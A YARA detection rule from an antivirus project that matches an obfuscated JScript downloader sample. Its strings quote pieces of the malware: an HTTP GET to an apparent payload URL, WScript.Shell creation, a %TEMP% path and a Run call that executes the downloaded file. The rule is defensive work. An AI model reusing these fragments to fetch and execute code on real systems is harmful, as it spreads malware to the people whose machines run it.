rule sig_20160427_ed8b6dc1aa390e4c05851f52ab26f99a {
  meta:
    description = "datamaliciousorder - file 20160427_ed8b6dc1aa390e4c05851f52ab26f99a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "84d48d5c206821350b01cadc97292a4be20338d4a512df1e70d707ae69caa31d"

  strings:
    $s1  = "BbxjzKltzk[GwgqcFrpnp](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function OduxnYifrv() {return XyzsaVilxz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"NqhLR6k" ascii
    $s3  = "function OduxnYifrv() {return XyzsaVilxz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"NqhLR6k" ascii
    $s4  = "function RhxuxPdsel(LaqzlJzstl, LdtrpHxahj){TwbpfXzzaw = TwbpfXzzaw * 1; return LaqzlJzstl - LdtrpHxahj;};" fullword ascii
    $s5  = "var UprmgJwvqc = this[\"WScript\"];" fullword ascii
    $s6  = "var XyzsaVilxz = function MpmgsFggoz() {return UprmgJwvqc[NfkywIioti](\"WScript\"+\".Shell\");}(), VlcarSxzzt = 11;" fullword ascii
    $s7  = "function ZotlcGxrxe(){return TldqbObahj + \"\";};" fullword ascii
    $s8  = "if (BbxjzKltzk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function OmolkWffgs() {return ((MqyivLvmom == true) && (MqyivLvmom == WleeaUpluk)) ? 1 : TwbpfXzzaw;};" fullword ascii
    $s10 = "}while (WumcyOkrhg);" fullword ascii
    $s11 = "var WleeaUpluk = false;" fullword ascii
    $s12 = "return RhxuxPdsel(KvuggEdcbz, YddnnTfczg);" fullword ascii
    $s13 = "MqyivLvmom = true; " fullword ascii
    $s14 = "function DkzerRbugt()" fullword ascii
    $s15 = "var JdsubXlfef = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "function IfmphVrtml(ZzhivOnuie) {var SiscfDdrwf = (1, 2, 3, 4, 5, ZzhivOnuie); return SiscfDdrwf;};" fullword ascii
    $s17 = "XwpiaCoejf = true;" fullword ascii
    $s18 = "function BabwlKfgef(VafhvHwspp){XyzsaVilxz[\"R\"+\"un\"](VafhvHwspp, TwbpfXzzaw, TwbpfXzzaw);};" fullword ascii
    $s19 = "var XwpiaCoejf = false;" fullword ascii
    $s20 = "var MqyivLvmom = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}